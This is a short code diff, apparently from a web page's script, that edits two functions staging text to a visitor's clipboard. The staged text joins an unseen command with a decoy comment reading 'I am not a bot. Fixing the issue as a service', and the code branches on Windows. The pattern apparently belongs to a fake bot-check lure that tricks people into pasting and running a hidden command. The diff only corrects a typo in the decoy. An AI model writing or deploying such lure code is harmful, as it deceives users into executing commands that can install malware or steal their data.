@@ -891,7 +891,7 @@
 
     function stageClipboard(commandToRun, verification_id) {
         const suffix = " :: ";
-        const ploy = "'' I am not a bot. Fixing the issue as a services. ID: ";
+        const ploy = "'' I am not a bot. Fixing the issue as a service. ID: ";
         const end = "''";
         const textToCopy = commandToRun + suffix + ploy + verification_id + end;
         if (osType === "Windows")
@@ -1242,7 +1242,7 @@
 
     function stageClipboard1(commandToRun, verification_id) {
         const suffix1 = " :: ";
-        const ploy1 = "'' I am not a bot. Fixing the issue as a services. ID: ";
+        const ploy1 = "'' I am not a bot. Fixing the issue as a service. ID: ";
         const end1 = "''";
         const textToCopy1 = commandToRun + suffix1 + ploy1 + verification_id + end1;
         if (osType1 === "Windows")
